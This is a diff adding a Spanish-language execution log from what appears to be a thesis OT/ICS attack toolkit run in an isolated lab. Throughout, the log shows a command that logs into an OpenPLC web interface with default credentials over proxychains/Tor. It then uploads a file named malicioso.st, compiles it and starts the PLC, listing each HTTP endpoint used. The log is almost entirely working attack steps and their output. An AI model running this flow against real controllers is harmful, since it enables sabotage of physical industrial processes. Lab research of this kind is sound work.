@@ -1,0 +1,54 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  OpenPLC - Subida + compilación + arranque (upload_run)
+======================================================================
+  Fecha      : 2026-10-12 13:52:11
+  Objetivo   : 192.168.10.10:8080 prog=UPLOAD-RUN-PoC
+  MITRE ICS  : T0821, T0831
+======================================================================
+$ proxychains python3 -m modules._cli.openplc_cli upload_run --target 192.168.10.10 --port 8080 --user openplc --password openplc --prog-name UPLOAD-RUN-PoC --prog-descr PoC TFM upload_run --st-file /ataques/work/malicioso.st
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[*] POST http://192.168.10.10:8080/login  (usuario=openplc)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 302
+[+] Sesión establecida.
+[*] Paso 1/4 - Backup del programa actualmente cargado
+[*] GET http://192.168.10.10:8080/dashboard  (para localizar el programa activo)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 200
+    -> Programa activo (según /dashboard): 'CVE-2026-71268-PoC'
+[*] GET http://192.168.10.10:8080/programs
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 200
+    (HTML volcado a /ataques/work/debug_192.168.10.10_1791813131_programs.html)
+    (HTML volcado a /ataques/work/debug_192.168.10.10_1791813131_dashboard.html)
+[debug] parser build 2026-10-12b (table_id-first)
+[debug] fila -> table_id=18, celdas=['SensoresModbus', 'programa_sensores.st', 'Oct 12, 2026 - 12:56PM']
+[*] GET http://192.168.10.10:8080/st-files/CVE-2026-71268-PoC  (único endpoint plausible)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 404 (207 bytes)
+[-] Este fork de OpenPLC no expone el .st por HTTP (confirmado contra
+    webserver.py del commit b5d4135). Guardo metadatos como evidencia.
+[*] Paso 2/4 - Subir fichero .st al PLC
+[*]   A) POST http://192.168.10.10:8080/upload-program  (file=malicioso.st)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+       -> HTTP 200
+       -> Servidor asignó: 925540.st
+[*]   B) POST http://192.168.10.10:8080/upload-program-action  (prog_file=925540.st)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+       -> HTTP 200
+[*] Paso 3/4 - Compilar programa (925540.st)
+[*]   GET http://192.168.10.10:8080/compile-program?file=925540.st
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+       -> HTTP 200
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+[+]   Compilación exitosa.
+[*] Paso 4/4 - GET http://192.168.10.10:8080/start_plc  (arranque efectivo)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 302
+[+] Flujo upload+compile+start completado.
+    El runtime debe estar ejecutando ahora el nuevo programa.
+[=] Código de salida: 0
